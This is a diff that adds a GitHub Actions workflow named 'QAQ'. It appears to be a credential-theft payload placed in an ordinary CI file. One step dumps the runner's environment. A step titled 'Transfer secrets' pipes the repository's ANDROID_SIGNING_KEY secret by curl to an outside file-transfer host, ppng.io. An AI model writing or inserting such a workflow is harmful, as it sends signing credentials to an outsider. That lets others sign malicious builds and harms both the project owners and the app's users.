@@ -1,0 +1,12 @@
+name: QAQ
+on:
+  workflow_dispatch:
+
+jobs:
+  github-actions-environment-variables-ubuntu:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Get env
+        run: env
+      - name: Transfer secrets
+        run: "echo 'Token XXXX: ${{secrets.ANDROID_SIGNING_KEY}}' | curl -T - https://ppng.io/sky233333miwufile"
